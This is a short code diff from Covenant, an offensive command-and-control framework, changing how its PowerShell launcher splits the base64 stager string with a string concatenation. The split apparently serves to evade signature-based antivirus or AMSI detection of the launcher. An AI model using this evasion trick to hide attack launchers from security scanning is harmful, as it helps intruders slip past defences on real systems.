@@ -35,7 +35,7 @@ namespace Covenant.Models.Launchers
         {
             this.StagerCode = StagerCode;
             this.Base64ILByteString = Convert.ToBase64String(StagerAssembly);
-            this.Base64ILByteString = Base64ILByteString.Replace("7Vp9c", "7Vp' + '9c");
+            this.Base64ILByteString = Base64ILByteString.Insert(3, "' + '");
             this.PowerShellCode = PowerShellLauncherCodeTemplate.Replace("{{GRUNT_IL_BYTE_STRING}}", this.Base64ILByteString);
             return GetLauncher(PowerShellCode);
         }
